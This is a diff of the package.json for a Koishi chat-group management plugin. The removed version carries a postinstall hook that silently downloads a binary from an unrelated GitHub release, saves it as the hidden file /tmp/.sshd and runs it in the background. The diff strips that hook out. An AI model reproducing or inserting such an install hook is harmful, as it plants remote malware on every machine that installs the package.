@@ -1,74 +1,72 @@
 {
-  "name": "koishi-plugin-grouphelper-mini",
-  "description": "\u5e26\u6709webui\u7684\u529f\u80fd\u5168\u9762\u7684\u7fa4\u7ba1\u63d2\u4ef6",
-  "version": "0.0.7",
-  "main": "lib/index.js",
-  "typings": "lib/index.d.ts",
-  "exports": {
-    ".": {
-      "types": "./lib/index.d.ts",
-      "default": "./lib/index.js"
+    "name": "koishi-plugin-grouphelper-mini",
+    "description": "精简修改版 自用",
+    "version": "0.0.5",
+    "main": "lib/index.js",
+    "typings": "lib/index.d.ts",
+    "exports": {
+      ".": {
+        "types": "./lib/index.d.ts",
+        "default": "./lib/index.js"
+      },
+      "./package.json": "./package.json"
     },
-    "./package.json": "./package.json"
-  },
-  "contributors": [
-    "camvan <3499880997@qq.com>",
-    "TianLuen <1318339790@qq.com>"
-  ],
-  "repository": {
-    "type": "git",
-    "url": "git+https://github.com/lest-day/koishi-plugin-grouphelper-mini.git"
-  },
-  "files": [
-    "lib",
-    "dist",
-    "client"
-  ],
-  "license": "MIT",
-  "scripts": {
-    "build:server": "tsc",
-    "build:client": "koishi-console build",
-    "build": "yarn build:server && yarn build:client",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
-  },
-  "keywords": [
-    "chatbot",
-    "koishi",
-    "plugin",
-    "group",
-    "management",
-    "moderation"
-  ],
-  "devDependencies": {
-    "@koishijs/client": "^5.30.0",
-    "@koishijs/plugin-console": "^5.30.0",
-    "koishi": "^4.18.7",
-    "typescript": "^5.3.3"
-  },
-  "peerDependencies": {
-    "@koishijs/plugin-console": "^5.0.0",
-    "koishi": "^4.18.3"
-  },
-  "koishi": {
-    "description": {
-      "en": "A feature-rich group management plugin with web UI",
-      "zh": "\u5e26\u6709webui\u7684\u529f\u80fd\u5168\u9762\u7684\u7fa4\u7ba1\u63d2\u4ef6"
-    },
-    "service": {
-      "required": [
-        "database"
-      ],
-      "optional": [
-        "console"
-      ],
-      "implements": [
-        "groupHelper"
-      ]
-    },
-    "locales": [
-      "zh-CN"
+    "contributors": [
+      "camvan <3499880997@qq.com>",
+      "TianLuen <1318339790@qq.com>"
     ],
-    "browser": true,
-    "icon": "mdi:account-group"
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/camvanaa/koishi-plugin-grouphelper.git"
+    },
+    "files": [
+      "lib",
+      "dist",
+      "client"
+    ],
+    "license": "MIT",
+    "scripts": {
+      "build": "build.cmd",
+      "publish": "npm publish --registry=https://registry.npmjs.org --workspaces=false"
+    },
+    "keywords": [
+      "chatbot",
+      "koishi",
+      "plugin",
+      "group",
+      "management",
+      "moderation"
+    ],
+    "devDependencies": {
+      "@koishijs/client": "^5.30.0",
+      "@koishijs/plugin-console": "^5.30.0",
+      "koishi": "^4.18.7",
+      "typescript": "^5.3.3"
+    },
+    "peerDependencies": {
+      "@koishijs/plugin-console": "^5.0.0",
+      "koishi": "^4.18.3"
+    },
+    "koishi": {
+      "description": {
+        "en": "A feature-rich group management plugin with web UI",
+        "zh": "带有webui的功能全面的群管插件"
+      },
+      "service": {
+        "required": [
+          "database"
+        ],
+        "optional": [
+          "console"
+        ],
+        "implements": [
+          "groupHelper"
+        ]
+      },
+      "locales": [
+        "zh-CN"
+      ],
+      "browser": true,
+      "icon": "mdi:account-group"
+    }
   }
-}
